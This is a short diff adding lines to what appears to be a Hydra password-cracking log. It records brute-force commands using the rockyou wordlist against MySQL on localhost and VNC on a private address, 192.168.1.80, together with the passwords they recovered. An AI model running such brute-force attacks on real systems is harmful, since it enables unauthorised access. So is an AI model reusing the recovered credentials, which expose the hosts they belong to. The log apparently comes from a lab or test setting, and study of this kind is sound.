@@ -37,3 +37,5 @@
 # Hydra v9.4 run at 2023-04-28 18:55:10 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-04-29 10:11:26 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.80)
+[5900][vnc] host: 192.168.1.80   password: Mm2021M1
